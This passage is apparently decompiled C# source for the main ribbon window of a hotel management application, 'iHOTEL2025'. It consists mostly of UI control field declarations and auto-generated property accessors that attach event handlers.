using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Ports;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using DevComponents.DotNetBar;
using DevComponents.Editors;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using iHOTEL2025.My;
using iHOTEL2025.My.Resources;

namespace iHOTEL2025;

public class frmMain1 : Office2007RibbonForm
{
	private static List<WeakReference> __ENCList;

	private DateTime dateNOW;

	private IContainer components;

	[AccessedThroughProperty("imageList1")]
	private ImageList _imageList1;

	[AccessedThroughProperty("tabStrip1")]
	private TabStrip _tabStrip1;

	[AccessedThroughProperty("ribbonControl1")]
	private RibbonControl _ribbonControl1;

	[AccessedThroughProperty("ribbonPanel1")]
	private RibbonPanel _ribbonPanel1;

	[AccessedThroughProperty("ribbonTabItem1")]
	private RibbonTabItem _ribbonTabItem1;

	[AccessedThroughProperty("RibbonTabItemGroup1")]
	private RibbonTabItemGroup _RibbonTabItemGroup1;

	[AccessedThroughProperty("ComboItem1")]
	private ComboItem _ComboItem1;

	[AccessedThroughProperty("ComboItem2")]
	private ComboItem _ComboItem2;

	[AccessedThroughProperty("ComboItem3")]
	private ComboItem _ComboItem3;

	[AccessedThroughProperty("ComboItem4")]
	private ComboItem _ComboItem4;

	[AccessedThroughProperty("ComboItem5")]
	private ComboItem _ComboItem5;

	[AccessedThroughProperty("ComboItem6")]
	private ComboItem _ComboItem6;

	[AccessedThroughProperty("ComboItem7")]
	private ComboItem _ComboItem7;

	[AccessedThroughProperty("QatCustomizeItem1")]
	private QatCustomizeItem _QatCustomizeItem1;

	[AccessedThroughProperty("ButtonFile")]
	private Office2007StartButton _ButtonFile;

	[AccessedThroughProperty("ButtonItem24")]
	private ButtonItem _ButtonItem24;

	[AccessedThroughProperty("ButtonItem25")]
	private ButtonItem _ButtonItem25;

	[AccessedThroughProperty("ButtonItem26")]
	private ButtonItem _ButtonItem26;

	[AccessedThroughProperty("ButtonItem27")]
	private ButtonItem _ButtonItem27;

	[AccessedThroughProperty("Bar1")]
	private Bar _Bar1;

	[AccessedThroughProperty("LabelItem1")]
	private LabelItem _LabelItem1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("RibbonPanel3")]
	private RibbonPanel _RibbonPanel3;

	[AccessedThroughProperty("RibbonBar5")]
	private RibbonBar _RibbonBar5;

	[AccessedThroughProperty("ButtonItem15")]
	private ButtonItem _ButtonItem15;

	[AccessedThroughProperty("ButtonItem16")]
	private ButtonItem _ButtonItem16;

	[AccessedThroughProperty("ButtonItem17")]
	private ButtonItem _ButtonItem17;

	[AccessedThroughProperty("ButtonItem18")]
	private ButtonItem _ButtonItem18;

	[AccessedThroughProperty("RibbonPanel2")]
	private RibbonPanel _RibbonPanel2;

	[AccessedThroughProperty("RibbonTabItem3")]
	private RibbonTabItem _RibbonTabItem3;

	[AccessedThroughProperty("ribbonBar7")]
	private RibbonBar _ribbonBar7;

	[AccessedThroughProperty("ButtonItem35")]
	private ButtonItem _ButtonItem35;

	[AccessedThroughProperty("ButtonItem14")]
	private ButtonItem _ButtonItem14;

	[AccessedThroughProperty("ButtonItem44")]
	private ButtonItem _ButtonItem44;

	[AccessedThroughProperty("ButtonItem19")]
	private ButtonItem _ButtonItem19;

	[AccessedThroughProperty("RibbonTabItemGroup2")]
	private RibbonTabItemGroup _RibbonTabItemGroup2;

	[AccessedThroughProperty("ButtonItem3")]
	private ButtonItem _ButtonItem3;

	[AccessedThroughProperty("ButtonItem1")]
	private ButtonItem _ButtonItem1;

	[AccessedThroughProperty("RibbonTabItemGroup3")]
	private RibbonTabItemGroup _RibbonTabItemGroup3;

	[AccessedThroughProperty("ButtonItem4")]
	private ButtonItem _ButtonItem4;

	[AccessedThroughProperty("ButtonItem7")]
	private ButtonItem _ButtonItem7;

	[AccessedThroughProperty("ButtonItem8")]
	private ButtonItem _ButtonItem8;

	[AccessedThroughProperty("ButtonItem22")]
	private ButtonItem _ButtonItem22;

	[AccessedThroughProperty("ButtonItem2")]
	private ButtonItem _ButtonItem2;

	[AccessedThroughProperty("StyleManager1")]
	private StyleManager _StyleManager1;

	[AccessedThroughProperty("ButtonItem31")]
	private ButtonItem _ButtonItem31;

	[AccessedThroughProperty("ButtonItem33")]
	private ButtonItem _ButtonItem33;

	[AccessedThroughProperty("RibbonBar3")]
	private RibbonBar _RibbonBar3;

	[AccessedThroughProperty("B13")]
	private ButtonItem _B13;

	[AccessedThroughProperty("RibbonPanel6")]
	private RibbonPanel _RibbonPanel6;

	[AccessedThroughProperty("RibbonTabItem5")]
	private RibbonTabItem _RibbonTabItem5;

	[AccessedThroughProperty("PanelEx1")]
	private PanelEx _PanelEx1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("RibbonBar1")]
	private RibbonBar _RibbonBar1;

	[AccessedThroughProperty("B2")]
	private ButtonItem _B2;

	[AccessedThroughProperty("B3")]
	private ButtonItem _B3;

	[AccessedThroughProperty("RibbonBar4")]
	private RibbonBar _RibbonBar4;

	[AccessedThroughProperty("B11")]
	private ButtonItem _B11;

	[AccessedThroughProperty("B10")]
	private ButtonItem _B10;

	[AccessedThroughProperty("RibbonBar9")]
	private RibbonBar _RibbonBar9;

	[AccessedThroughProperty("RibbonBar8")]
	private RibbonBar _RibbonBar8;

	[AccessedThroughProperty("B14")]
	private ButtonItem _B14;

	[AccessedThroughProperty("B15")]
	private ButtonItem _B15;

	[AccessedThroughProperty("B17")]
	private ButtonItem _B17;

	[AccessedThroughProperty("B16")]
	private ButtonItem _B16;

	[AccessedThroughProperty("RibbonBar10")]
	private RibbonBar _RibbonBar10;

	[AccessedThroughProperty("B21")]
	private ButtonItem _B21;

	[AccessedThroughProperty("B22")]
	private ButtonItem _B22;

	[AccessedThroughProperty("RibbonBar11")]
	private RibbonBar _RibbonBar11;

	[AccessedThroughProperty("B7")]
	private ButtonItem _B7;

	[AccessedThroughProperty("B8")]
	private ButtonItem _B8;

	[AccessedThroughProperty("ButtonItem38")]
	private ButtonItem _ButtonItem38;

	[AccessedThroughProperty("B6")]
	private ButtonItem _B6;

	[AccessedThroughProperty("B9")]
	private ButtonItem _B9;

	[AccessedThroughProperty("B5")]
	private ButtonItem _B5;

	[AccessedThroughProperty("B4")]
	private ButtonItem _B4;

	[AccessedThroughProperty("B1")]
	private ButtonItem _B1;

	[AccessedThroughProperty("LabelStatus")]
	private LabelItem _LabelStatus;

	[AccessedThroughProperty("RibbonBar2")]
	private RibbonBar _RibbonBar2;

	[AccessedThroughProperty("ButtonItem23")]
	private ButtonItem _ButtonItem23;

	[AccessedThroughProperty("B19")]
	private ButtonItem _B19;

	[AccessedThroughProperty("B20")]
	private ButtonItem _B20;

	[AccessedThroughProperty("B18")]
	private ButtonItem _B18;

	[AccessedThroughProperty("ButtonItem49")]
	private ButtonItem _ButtonItem49;

	[AccessedThroughProperty("RibbonPanel5")]
	private RibbonPanel _RibbonPanel5;

	[AccessedThroughProperty("RibbonBar12")]
	private RibbonBar _RibbonBar12;

	[AccessedThroughProperty("RibbonTabItem4")]
	private RibbonTabItem _RibbonTabItem4;

	[AccessedThroughProperty("RibbonBar13")]
	private RibbonBar _RibbonBar13;

	[AccessedThroughProperty("ItemContainer4")]
	private ItemContainer _ItemContainer4;

	[AccessedThroughProperty("R17")]
	private ButtonItem _R17;

	[AccessedThroughProperty("R18")]
	private ButtonItem _R18;

	[AccessedThroughProperty("RibbonBar14")]
	private RibbonBar _RibbonBar14;

	[AccessedThroughProperty("ItemContainer5")]
	private ItemContainer _ItemContainer5;

	[AccessedThroughProperty("R19")]
	private ButtonItem _R19;

	[AccessedThroughProperty("R20")]
	private ButtonItem _R20;

	[AccessedThroughProperty("RibbonBar6")]
	private RibbonBar _RibbonBar6;

	[AccessedThroughProperty("ButtonItem48")]
	private ButtonItem _ButtonItem48;

	[AccessedThroughProperty("B12")]
	private ButtonItem _B12;

	[AccessedThroughProperty("ButtonItem6")]
	private ButtonItem _ButtonItem6;

	[AccessedThroughProperty("ItemContainer3")]
	private ItemContainer _ItemContainer3;

	[AccessedThroughProperty("R13")]
	private ButtonItem _R13;

	[AccessedThroughProperty("ButtonItem10")]
	private ButtonItem _ButtonItem10;

	[AccessedThroughProperty("จองแบบระบ\u0e38ห\u0e49อง")]
	private ButtonItem buttonItem_0;

	[AccessedThroughProperty("ButtonItem13")]
	private ButtonItem _ButtonItem13;

	[AccessedThroughProperty("ButtonItem21")]
	private ButtonItem _ButtonItem21;

	[AccessedThroughProperty("ButtonItem28")]
	private ButtonItem _ButtonItem28;

	[AccessedThroughProperty("ButtonItem29")]
	private ButtonItem _ButtonItem29;

	[AccessedThroughProperty("R15")]
	private ButtonItem _R15;

	[AccessedThroughProperty("ButtonItem9")]
	private ButtonItem _ButtonItem9;

	[AccessedThroughProperty("ButtonItem32")]
	private ButtonItem _ButtonItem32;

	[AccessedThroughProperty("SerialPort1")]
	private SerialPort _SerialPort1;

	[AccessedThroughProperty("ButtonItem34")]
	private ButtonItem _ButtonItem34;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("TimerOnoff")]
	private Timer _TimerOnoff;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("LabelItem2")]
	private LabelItem _LabelItem2;

	[AccessedThroughProperty("ButtonItem36")]
	private ButtonItem _ButtonItem36;

	[AccessedThroughProperty("RibbonPanel4")]
	private RibbonPanel _RibbonPanel4;

	[AccessedThroughProperty("RibbonBar16")]
	private RibbonBar _RibbonBar16;

	[AccessedThroughProperty("B24")]
	private ButtonItem _B24;

	[AccessedThroughProperty("อ\u0e31บเดทโปรแกรม")]
	private RibbonTabItem ribbonTabItem_0;

	[AccessedThroughProperty("RibbonBar17")]
	private RibbonBar _RibbonBar17;

	[AccessedThroughProperty("ButtonItem37")]
	private ButtonItem _ButtonItem37;

	[AccessedThroughProperty("URL_ON_OFF")]
	private ListView _URL_ON_OFF;

	[AccessedThroughProperty("ColumnHeader1")]
	private ColumnHeader _ColumnHeader1;

	[AccessedThroughProperty("LabelItem3")]
	private LabelItem _LabelItem3;

	[AccessedThroughProperty("URL_ON_OFF_SERIALS")]
	private ListView _URL_ON_OFF_SERIALS;

	[AccessedThroughProperty("ColumnHeader2")]
	private ColumnHeader _ColumnHeader2;

	[AccessedThroughProperty("TimerSerials")]
	private Timer _TimerSerials;

	[AccessedThroughProperty("RibbonPanel7")]
	private RibbonPanel _RibbonPanel7;

	[AccessedThroughProperty("RibbonBar18")]
	private RibbonBar _RibbonBar18;

	[AccessedThroughProperty("ButtonItem39")]
	private ButtonItem _ButtonItem39;

	[AccessedThroughProperty("RibbonTabItem2")]
	private RibbonTabItem _RibbonTabItem2;

	[AccessedThroughProperty("B11_2")]
	private ButtonItem _B11_2;

	[AccessedThroughProperty("ButtonItem41")]
	private ButtonItem _ButtonItem41;

	[AccessedThroughProperty("ButtonItem42")]
	private ButtonItem _ButtonItem42;

	[AccessedThroughProperty("ButtonItem40")]
	private ButtonItem _ButtonItem40;

	[AccessedThroughProperty("ButtonItem43")]
	private ButtonItem _ButtonItem43;

	[AccessedThroughProperty("R1")]
	private ButtonItem _R1;

	[AccessedThroughProperty("R2")]
	private ButtonItem _R2;

	[AccessedThroughProperty("R3")]
	private ButtonItem _R3;

	[AccessedThroughProperty("R4")]
	private ButtonItem _R4;

	[AccessedThroughProperty("R5")]
	private ButtonItem _R5;

	[AccessedThroughProperty("R10")]
	private ButtonItem _R10;

	[AccessedThroughProperty("R11")]
	private ButtonItem _R11;

	[AccessedThroughProperty("R12")]
	private ButtonItem _R12;

	[AccessedThroughProperty("ButtonItem45")]
	private ButtonItem _ButtonItem45;

	[AccessedThroughProperty("R8")]
	private ButtonItem _R8;

	[AccessedThroughProperty("R9")]
	private ButtonItem _R9;

	[AccessedThroughProperty("ButtonItem56")]
	private ButtonItem _ButtonItem56;

	[AccessedThroughProperty("ButtonItem57")]
	private ButtonItem _ButtonItem57;

	[AccessedThroughProperty("ButtonItem58")]
	private ButtonItem _ButtonItem58;

	[AccessedThroughProperty("ButtonItem5")]
	private ButtonItem _ButtonItem5;

	[AccessedThroughProperty("R7")]
	private ButtonItem _R7;

	[AccessedThroughProperty("R14")]
	private ButtonItem _R14;

	[AccessedThroughProperty("R16")]
	private ButtonItem _R16;

	[AccessedThroughProperty("ButtonItem20")]
	private ButtonItem _ButtonItem20;

	[AccessedThroughProperty("ButtonItem50")]
	private ButtonItem _ButtonItem50;

	[AccessedThroughProperty("ButtonItem11")]
	private ButtonItem _ButtonItem11;

	[AccessedThroughProperty("R6")]
	private ButtonItem _R6;

	[AccessedThroughProperty("ButtonItem12")]
	private ButtonItem _ButtonItem12;

	[AccessedThroughProperty("ButtonItem30")]
	private ButtonItem _ButtonItem30;

	[AccessedThroughProperty("ButtonItem46")]
	private ButtonItem _ButtonItem46;

	[AccessedThroughProperty("ButtonItem47")]
	private ButtonItem _ButtonItem47;

	[AccessedThroughProperty("ButtonItem51")]
	private ButtonItem _ButtonItem51;

	[AccessedThroughProperty("LabelItem4")]
	private LabelItem _LabelItem4;

	[AccessedThroughProperty("TimerMouse")]
	private Timer _TimerMouse;

	[AccessedThroughProperty("SerialPort2")]
	private SerialPort _SerialPort2;

	[AccessedThroughProperty("ButtonNotification")]
	private ButtonItem _ButtonNotification;

	[AccessedThroughProperty("LabelItemNotify")]
	private LabelItem _LabelItemNotify;

	[AccessedThroughProperty("TimerNotifly")]
	private Timer _TimerNotifly;

	[AccessedThroughProperty("TimerCheckNotify")]
	private Timer _TimerCheckNotify;

	[AccessedThroughProperty("LabelItem6")]
	private LabelItem _LabelItem6;

	[AccessedThroughProperty("ButtonItem52")]
	private ButtonItem _ButtonItem52;

	[AccessedThroughProperty("ButtonItem53")]
	private ButtonItem _ButtonItem53;

	[AccessedThroughProperty("ButtonItem_Version")]
	private ButtonItem _ButtonItem_Version;

	[AccessedThroughProperty("WebBrowser2")]
	private WebBrowser _WebBrowser2;

	[AccessedThroughProperty("TimerChkVer")]
	private Timer _TimerChkVer;

	[AccessedThroughProperty("ButtonItem54")]
	private ButtonItem _ButtonItem54;

	[AccessedThroughProperty("ButtonItem60")]
	private ButtonItem _ButtonItem60;

	[AccessedThroughProperty("ButtonItem55")]
	private ButtonItem _ButtonItem55;

	[AccessedThroughProperty("ButtonItem61")]
	private ButtonItem _ButtonItem61;

	[AccessedThroughProperty("ItemContainer1")]
	private ItemContainer _ItemContainer1;

	[AccessedThroughProperty("ButtonItem62")]
	private ButtonItem _ButtonItem62;

	[AccessedThroughProperty("ButtonItem59")]
	private ButtonItem _ButtonItem59;

	[AccessedThroughProperty("ButtonItem63")]
	private ButtonItem _ButtonItem63;

	[AccessedThroughProperty("ButtonItem64")]
	private ButtonItem _ButtonItem64;

	[AccessedThroughProperty("ButtonItem65")]
	private ButtonItem _ButtonItem65;

	[AccessedThroughProperty("ButtonItem66")]
	private ButtonItem _ButtonItem66;

	[AccessedThroughProperty("ButtonItem67")]
	private ButtonItem _ButtonItem67;

	[AccessedThroughProperty("Label100")]
	private Label _Label100;

	[AccessedThroughProperty("ButtonItem68")]
	private ButtonItem _ButtonItem68;

	[AccessedThroughProperty("TimerDate")]
	private Timer _TimerDate;

	[AccessedThroughProperty("ButtonItem69")]
	private ButtonItem _ButtonItem69;

	[AccessedThroughProperty("ButtonItem70")]
	private ButtonItem _ButtonItem70;

	[AccessedThroughProperty("TimerWeb")]
	private Timer _TimerWeb;

	[AccessedThroughProperty("WebBrowserBlock")]
	private WebBrowser _WebBrowserBlock;

	[AccessedThroughProperty("ButtonItem71")]
	private ButtonItem _ButtonItem71;

	[AccessedThroughProperty("TimerUPDATE")]
	private Timer _TimerUPDATE;

	[AccessedThroughProperty("B23")]
	private ButtonItem _B23;

	private Point mousepos;

	private string string_0;

	private decimal countMouse;

	private Balloon m_AlertOnLoad;

	private bool ACT;

	private bool ISOVER;

	internal virtual ImageList imageList1
	{
		[DebuggerNonUserCode]
		get
		{
			return _imageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_imageList1 = value;
		}
	}

	internal virtual TabStrip tabStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _tabStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = tabStrip1_TabRemoved;
			EventHandler value3 = tabStrip1_TabItemOpen;
			if (_tabStrip1 != null)
			{
				_tabStrip1.TabRemoved -= value2;
				_tabStrip1.TabItemOpen -= value3;
			}
			_tabStrip1 = value;
			if (_tabStrip1 != null)
			{
				_tabStrip1.TabRemoved += value2;
				_tabStrip1.TabItemOpen += value3;
			}
		}
	}

	internal virtual RibbonControl ribbonControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ribbonControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ribbonControl1_Click;
			if (_ribbonControl1 != null)
			{
				_ribbonControl1.Click -= value2;
			}
			_ribbonControl1 = value;
			if (_ribbonControl1 != null)
			{
				_ribbonControl1.Click += value2;
			}
		}
	}

	internal virtual RibbonPanel ribbonPanel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ribbonPanel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ribbonPanel1 = value;
		}
	}

	internal virtual RibbonTabItem ribbonTabItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ribbonTabItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ribbonTabItem1_Click;
			if (_ribbonTabItem1 != null)
			{
				_ribbonTabItem1.Click -= value2;
			}
			_ribbonTabItem1 = value;
			if (_ribbonTabItem1 != null)
			{
				_ribbonTabItem1.Click += value2;
			}
		}
	}

	internal virtual RibbonTabItemGroup RibbonTabItemGroup1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonTabItemGroup1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonTabItemGroup1 = value;
		}
	}

	internal virtual ComboItem ComboItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboItem1 = value;
		}
	}

	internal virtual ComboItem ComboItem2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboItem2 = value;
		}
	}

	internal virtual ComboItem ComboItem3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboItem3 = value;
		}
	}

	internal virtual ComboItem ComboItem4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboItem4 = value;
		}
	}

	internal virtual ComboItem ComboItem5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboItem5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboItem5 = value;
		}
	}

	internal virtual ComboItem ComboItem6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboItem6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboItem6 = value;
		}
	}

	internal virtual ComboItem ComboItem7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboItem7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboItem7 = value;
		}
	}

	internal virtual QatCustomizeItem QatCustomizeItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _QatCustomizeItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_QatCustomizeItem1 = value;
		}
	}

	internal virtual Office2007StartButton ButtonFile
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonFile;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonFile = value;
		}
	}

	internal virtual ButtonItem ButtonItem24
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem24 = value;
		}
	}

	internal virtual ButtonItem ButtonItem25
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem25;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem25 = value;
		}
	}

	internal virtual ButtonItem ButtonItem26
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem26;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem26 = value;
		}
	}

	internal virtual ButtonItem ButtonItem27
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem27;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem27 = value;
		}
	}

	internal virtual Bar Bar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Bar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Bar1 = value;
		}
	}

	internal virtual LabelItem LabelItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _LabelItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LabelItem1 = value;
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.Tick -= value2;
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.Tick += value2;
			}
		}
	}

	internal virtual RibbonPanel RibbonPanel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonPanel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonPanel3 = value;
		}
	}

	internal virtual RibbonBar RibbonBar5
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar5 = value;
		}
	}

	internal virtual ButtonItem ButtonItem15
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem15 = value;
		}
	}

	internal virtual ButtonItem ButtonItem16
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem16 = value;
		}
	}

	internal virtual ButtonItem ButtonItem17
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem17 = value;
		}
	}

	internal virtual ButtonItem ButtonItem18
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem18 = value;
		}
	}

	internal virtual RibbonPanel RibbonPanel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonPanel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonPanel2 = value;
		}
	}

	internal virtual RibbonTabItem RibbonTabItem3
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonTabItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonTabItem3 = value;
		}
	}

	internal virtual RibbonBar ribbonBar7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ribbonBar7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ribbonBar7 = value;
		}
	}

	internal virtual ButtonItem ButtonItem35
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem35;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem35_Click_1;
			if (_ButtonItem35 != null)
			{
				_ButtonItem35.Click -= value2;
			}
			_ButtonItem35 = value;
			if (_ButtonItem35 != null)
			{
				_ButtonItem35.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem14
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem14_Click_1;
			if (_ButtonItem14 != null)
			{
				_ButtonItem14.Click -= value2;
			}
			_ButtonItem14 = value;
			if (_ButtonItem14 != null)
			{
				_ButtonItem14.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem44
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem44;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem44_Click_1;
			if (_ButtonItem44 != null)
			{
				_ButtonItem44.Click -= value2;
			}
			_ButtonItem44 = value;
			if (_ButtonItem44 != null)
			{
				_ButtonItem44.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem19
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem19_Click;
			if (_ButtonItem19 != null)
			{
				_ButtonItem19.Click -= value2;
			}
			_ButtonItem19 = value;
			if (_ButtonItem19 != null)
			{
				_ButtonItem19.Click += value2;
			}
		}
	}

	internal virtual RibbonTabItemGroup RibbonTabItemGroup2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonTabItemGroup2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonTabItemGroup2 = value;
		}
	}

	internal virtual ButtonItem ButtonItem3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem3 = value;
		}
	}

	internal virtual ButtonItem ButtonItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem1 = value;
		}
	}

	internal virtual RibbonTabItemGroup RibbonTabItemGroup3
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonTabItemGroup3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonTabItemGroup3 = value;
		}
	}

	internal virtual ButtonItem ButtonItem4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem4 = value;
		}
	}

	internal virtual ButtonItem ButtonItem7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem7 = value;
		}
	}

	internal virtual ButtonItem ButtonItem8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem8 = value;
		}
	}

	internal virtual ButtonItem ButtonItem22
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem22 = value;
		}
	}

	internal virtual ButtonItem ButtonItem2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem2 = value;
		}
	}

	internal virtual StyleManager StyleManager1
	{
		[DebuggerNonUserCode]
		get
		{
			return _StyleManager1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StyleManager1 = value;
		}
	}

	internal virtual ButtonItem ButtonItem31
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem31;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem31_Click;
			if (_ButtonItem31 != null)
			{
				_ButtonItem31.Click -= value2;
			}
			_ButtonItem31 = value;
			if (_ButtonItem31 != null)
			{
